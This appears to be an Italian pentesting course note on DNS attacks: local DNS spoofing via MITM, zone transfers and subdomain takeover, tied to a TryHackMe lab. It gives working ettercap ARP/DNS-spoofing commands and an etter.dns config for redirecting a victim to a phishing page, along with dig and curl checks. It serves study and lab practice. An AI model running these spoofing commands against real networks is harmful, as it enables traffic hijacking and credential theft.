# DNS Attacks

**Difficolta:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [../01-Information-Gathering/01-Passive-Recon-OSINT.md](../01-Information-Gathering/01-Passive-Recon-OSINT.md)
**Lab:** TryHackMe — DNS in Detail

---

## Obiettivo

Capire i principali vettori di attacco legati al DNS: spoofing/cache poisoning locale, zone transfer come fuga di informazioni, e subdomain takeover. Completa il quadro degli attacchi network-level insieme a MITM e Responder.

---

## Concetti chiave

### DNS spoofing locale vs cache poisoning

- **DNS spoofing locale (LAN):** una volta in posizione MITM (vedi [01-MITM-ARP-Spoofing.md](01-MITM-ARP-Spoofing.md)), l'attaccante intercetta le richieste DNS della vittima e risponde con IP falsi prima del vero server DNS
- **Cache poisoning classico (Kaminsky-style):** attacco contro un resolver DNS ricorsivo per inserire record falsi nella sua cache, oggi mitigato da randomizzazione porta sorgente/transaction ID nei resolver moderni

### Zone transfer come vettore

Un DNS server mal configurato che permette `AXFR` a chiunque rivela l'intera zona (tutti i sottodomini, IP interni, record MX/TXT) — gia trattato lato enumerazione in [../03-Enumeration/07-SMTP-DNS-Enumeration.md](../03-Enumeration/07-SMTP-DNS-Enumeration.md), qui lo inquadriamo come vettore di attacco/ricognizione avanzata.

### Subdomain takeover (cenno)

Se un record CNAME punta a un servizio esterno (es. `blog.target.com -> qualcosa.herokuapp.com`) e quel servizio non e piu registrato, un attaccante puo registrarlo e servire contenuto arbitrario sotto il dominio della vittima.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| dig | `dig axfr @ns1.target.com target.com` | zone transfer se permesso | quasi sempre negato su target moderni |
| dnsspoof (dsniff) | `dnsspoof -i eth0` | risponde a query DNS con IP falsi | richiede posizione MITM attiva |
| ettercap plugin dns_spoof | `ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /// ///` | spoofing DNS integrato nel MITM | configurazione in `etter.dns` |
| dnsrecon / dnsenum | `dnsrecon -d target.com -t axfr,std` | enumerazione DNS completa | utile anche solo per ricognizione |

---

## Payload / Esempi

### Esempio 1: spoofing DNS locale con ettercap

```
# /etc/ettercap/etter.dns
target.com A 10.10.10.100
*.target.com A 10.10.10.100
```

```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.10.10.5// /10.10.10.1//
```

**Spiegazione:** una volta in MITM, ogni richiesta DNS della vittima per `target.com` riceve come risposta l'IP scelto dall'attaccante invece di quello reale — utile per reindirizzare la vittima verso una pagina di phishing/cattura credenziali.

### Esempio 2: verifica manuale di zone transfer

```bash
dig axfr @ns1.target.com target.com
```

**Output atteso (se vulnerabile):**
```
target.com.        3600  IN  SOA  ns1.target.com. admin.target.com. ...
internal.target.com. 3600 IN A   10.0.5.20
vpn.target.com.    3600  IN  A   10.0.5.21
```

**Spiegazione:** una zona esposta rivela infrastruttura interna che normalmente richiederebbe brute force di sottodomini.

### Esempio 3: identificare un CNAME "orfano" (subdomain takeover candidato)

```bash
dig CNAME blog.target.com
curl -sI https://qualcosa.herokuapp.com
```

**Spiegazione:** se il CNAME punta a un servizio che risponde con un errore tipo "No such app" o "NXDOMAIN", il sottodominio e potenzialmente reclamabile registrando la risorsa sul provider esterno.

---

## Lab Hands-On

### Lab 1: TryHackMe — DNS in Detail
**Obiettivo:** enumerare record DNS e verificare zone transfer su un dominio lab
**Difficulty:** Facile
**Time:** 30 min

**Walkthrough breve:**
1. Enumera tutti i record principali con `dig`/`dnsrecon`
2. Verifica se il zone transfer e permesso
3. Documenta ogni sottodominio/IP interno scoperto

---

## Common Mistakes

- Confondere zone transfer negato (comune, ben configurato) con vulnerabilita reale -> non tutti i DNS server sono attaccabili
- Fare DNS spoofing senza essere gia in posizione MITM -> il pacchetto falso arriva sempre dopo quello legittimo e viene ignorato
- Ignorare i record TXT (SPF/DKIM) che spesso rivelano provider terzi in uso

---

## Link Utili

- [RFC 5936 — DNS Zone Transfer (AXFR)](https://www.rfc-editor.org/rfc/rfc5936)

---

## Connessioni

- **Prerequisito:** [../01-Information-Gathering/01-Passive-Recon-OSINT.md](../01-Information-Gathering/01-Passive-Recon-OSINT.md)
- **Prossimo Step:** [../07-Metasploit-Framework/01-Msfconsole-Basics.md](../07-Metasploit-Framework/01-Msfconsole-Basics.md)
- **Combinazione con:** [01-MITM-ARP-Spoofing.md](01-MITM-ARP-Spoofing.md)

---

## Checklist di padronanza

- [ ] So spiegare la differenza tra DNS spoofing locale e cache poisoning
- [ ] So verificare se un DNS server permette zone transfer
- [ ] So riconoscere un candidato a subdomain takeover
- [ ] So combinare DNS spoofing con una posizione MITM gia ottenuta

---

## Note personali

_(spazio libero)_
